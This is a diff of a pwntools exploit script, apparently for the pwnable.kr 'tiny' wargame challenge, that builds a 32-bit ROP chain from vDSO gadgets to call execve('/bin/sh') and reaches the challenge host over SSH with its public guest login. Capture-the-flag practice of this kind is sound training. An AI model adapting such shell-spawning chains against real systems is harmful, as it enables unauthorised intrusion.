@@ -4,7 +4,6 @@ from pwnlib.asm import environ
 from pwnlib.util.proc import exe;
 
 vDSO_base = 0xf7ffc000;
-
 # context.arch="i386"
 # context.kernel="amd64"
 # context.os="linux"
@@ -15,10 +14,11 @@ context.binary = elf
 
 # the binary is 32 bit, so we will use int 0x80 and not syscall;
 syscall_addr = vDSO_base+  0x00000577;
-pop_ebx_esi_ebp = vDSO_base+0x00001aad;
+pop_ebx_esi_edi_ebp = vDSO_base+0x00000dea;
 pop_edx_ecx = vDSO_base+0x0000057a;
 pop_eax = 0x08048074;
 bin_sh_chain_4000=b"/"*(0x1000-len("bin/sh")) +b"bin/sh";
+pop_ebp = 0xf7ffcded
 
 bin_sh=b"/bin/sh";
 
@@ -28,7 +28,7 @@ ret=p32(0xf7ffc57c)
 
 # split in two for readability;
 
-payload1 = flat(pop_ebx_esi_ebp,bin_sh,garbage,garbage);
+payload1 = flat(pop_ebx_esi_edi_ebp,bin_sh,garbage,garbage);
 
 payload2 = flat(syscall_addr);
 
@@ -36,11 +36,20 @@ final_payload = payload1+payload2;
 
 print(final_payload)
 
-argv = [p32(pop_ebx_esi_ebp),bin_sh,garbage,garbage,p32(pop_edx_ecx),b"",b"",b"",b"",b"",p32(syscall_addr)]
+argv = [p32(pop_ebp),p32(pop_ebx_esi_edi_ebp),bin_sh,garbage,garbage,garbage,p32(pop_edx_ecx),b"",b"",p32(syscall_addr),b""]
+
+# pop ebp to get rid of the address call pushes
+# followed by a rop chain to set the stage for execve
 
 
-argv_2=[ret,ret,ret,ret,ret,p32(pop_ebx_esi_ebp),bin_sh,garbage,garbage,p32(pop_edx_ecx)]
+argv2=[ret,ret,ret,ret,ret,p32(pop_ebx_esi_edi_ebp),bin_sh,garbage,garbage,p32(pop_edx_ecx)]
 
+
+env = dict()
+
+env["1"] = "1"
+env[""] = "bin/sh"
+env["2"] = "2"
 
 def main():
     if(len(sys.argv) <2):
@@ -50,7 +59,7 @@ def main():
             s = ssh(user='tiny',host='pwnable.kr',port=2222,password='guest') 
             p= s.process(f"./{binary_name}") 
         elif(sys.argv[1] == "gdb"):
-            p = gdb.debug(["./tiny"]+argv,  env={}, aslr=False)
+            p = gdb.debug(["./tiny"]+argv,  env=env, aslr=False)
             sleep(10000)
         else:
             p = process(argv=argv, executable='./tiny', env={},aslr=False)
